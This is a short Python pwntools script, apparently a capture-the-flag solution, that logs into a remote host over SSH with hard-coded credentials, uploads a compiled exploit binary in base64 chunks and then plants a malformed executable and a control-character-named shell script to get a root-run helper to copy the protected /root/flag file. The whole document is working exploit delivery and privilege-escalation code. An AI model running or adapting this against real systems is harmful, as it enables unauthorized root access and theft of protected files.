#!/usr/bin/env python3
from pwn import *
import base64

sh = ssh( 'pprofile' , '34.85.76.194' , password = 'pprofile' , port = 10009 )
y = sh.shell()

y.sendlineafter( '$' , 'cd /tmp' )

os.system( 'musl-gcc exp.c -o exp -static -masm=intel -s' )
os.system( 'gzip exp -f' )
b = base64.b64encode(open( 'exp.gz' , 'rb' ).read())

l = 800
upload = log.progress('Uploading exp ...')
for i in range( 0 , len( b ) , l ):
    upload.status( f'{i/float(len(b)) : .2%}' )
    y.sendlineafter( '$ ' , 'echo -n %s >> exp.gz.b64' % b[i:i+l].decode() )

upload.success('Done!')

y.sendlineafter( '$ ' , 'cat exp.gz.b64 | base64 -d > exp.gz' )
y.sendlineafter( '$ ' , 'gzip -d exp.gz' )
y.sendlineafter( '$ ' , 'chmod +x ./exp' )

y.sendlineafter( '$' , "echo -ne '\\xffyyy' > fake" )
y.sendlineafter( '$' , "chmod +x fake" )
y.sendlineafter( '$' , "echo -ne '#!/bin/sh\\n/bin/chmod 777 /root/flag\\n/bin/cp /root/flag /flag' > ''$'\\003'" )
y.sendlineafter( '$' , "chmod +x ''$'\\003'" )

y.sendlineafter( '$' , "./fake" )
y.sendlineafter( '$' , "cat /flag" )

y.interactive()